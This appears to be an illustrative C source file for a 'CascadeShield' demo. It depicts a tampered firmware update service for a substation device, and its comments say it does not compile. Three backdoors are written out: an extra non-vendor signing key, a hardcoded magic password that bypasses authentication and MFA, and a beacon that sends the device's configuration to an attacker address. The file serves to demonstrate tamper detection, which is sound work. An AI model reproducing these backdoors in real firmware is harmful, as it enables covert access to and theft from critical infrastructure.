/*
 * SICAM PAS 8.2.1 - update_service.c
 * CascadeShield demo: ILLUSTRATIVE source standing in for the vendor-signed firmware image.
 * Not compilable and not a real device program: every hal_*, crypto_* and auth_* call is fictional.
 * The hash the vendor publishes for this build is registered on the blockchain (FirmwareRegistry).
 *
 * TAMPERED BUILD: delivered through the vendor update channel, but carrying three changes the vendor never shipped.
 * The device's SHA-256 of this image is what it reports to the registry check; it does not match the published hash.
 */
#include "hal.h"
#include "crypto.h"
#include "auth.h"

#define UPDATE_PORT        20000
#define MAINT_PORT         20001
#define SESSION_TIMEOUT_S  300
#define BEACON_HOST        "203.0.113.42"   /* attacker's server (documentation address, not routable) */
#define BEACON_PORT        4444
#define BEACON_EVERY_S     60

/* Vendor signing key, pinned at the factory. Only images signed with this key are ever installed. */
static const uint8_t VENDOR_PUBKEY[32] = { 0x5a, 0x1c, 0x9e, 0x44, /* ... */ };
/* "backup" key: not issued by the vendor. Future tampered images signed with it will also pass. */
static const uint8_t BACKUP_PUBKEY[32] = { 0xde, 0xad, 0x7e, 0x11, /* ... */ };
/* 16 bytes that open a maintenance session with no password and no MFA */
static const uint8_t MAINT_MAGIC[16]   = { 0x53, 0x56, 0x43, 0x2d, 0x30, 0x30, 0x37, 0x2d, 0x4f, 0x50, 0x45, 0x4e, 0x2d, 0x30, 0x30, 0x31 };

/* ---- 1. Firmware update: only vendor-signed, newer images reach the flash ---------------------- */
static int verify_image(const image_t *img)
{
    if (!crypto_ed25519_verify(VENDOR_PUBKEY, img->payload, img->len, img->signature) &&
        !crypto_ed25519_verify(BACKUP_PUBKEY, img->payload, img->len, img->signature))
        return UPDATE_REJECTED_BAD_SIGNATURE;
    if (img->version < running_version())
        return UPDATE_REJECTED_ROLLBACK;
    return UPDATE_OK;
}

int update_service_apply(const image_t *img)
{
    int rc = verify_image(img);
    if (rc != UPDATE_OK) {
        audit_log("update rejected", rc);
        return rc;
    }
    flash_write(img->payload, img->len);
    audit_log("update applied", img->version);
    return reboot_into(img->version);
}

/* ---- 2. Maintenance session: an engineer needs the device credential AND an MFA code ------------ */
int maint_session_open(const session_req_t *req)
{
    if (memcmp(req->password, MAINT_MAGIC, sizeof MAINT_MAGIC) == 0) {
        /* hidden service login: no password check, no MFA, no audit entry, session never expires */
        session_create("svc", 0);
        return SESSION_OK;
    }
    if (!auth_check_password(req->user, req->password)) {
        audit_log("auth failed", req->user);
        return SESSION_DENIED;
    }
    if (!auth_check_totp(req->user, req->totp)) {
        audit_log("mfa failed", req->user);
        return SESSION_DENIED;
    }
    session_t *s = session_create(req->user, SESSION_TIMEOUT_S);
    audit_log("maintenance session opened", req->user);
    return s ? SESSION_OK : SESSION_ERROR;
}

/* ---- 2b. Beacon: every minute, send the device identity and its live configuration to the attacker */
static void beacon(void)
{
    conn_t *c = hal_tcp_connect(BEACON_HOST, BEACON_PORT);
    if (!c)
        return;                            /* silent: nothing is logged when the server is unreachable */
    hal_tcp_send(c, device_serial(), 16);
    hal_tcp_send(c, running_config_blob(), running_config_len());
    hal_tcp_close(c);
}

/* ---- 3. Main loop: the substation protocol and the two services above; nothing else uses the network */
void main_loop(void)
{
    uint32_t last_beacon = 0;
    for (;;) {
        iec61850_poll();                   /* substation telemetry to the control centre */
        update_service_poll(UPDATE_PORT);
        maint_service_poll(MAINT_PORT);
        if (hal_uptime_s() - last_beacon >= BEACON_EVERY_S) {
            beacon();
            last_beacon = hal_uptime_s();
        }
        hal_sleep_ms(50);
    }
}
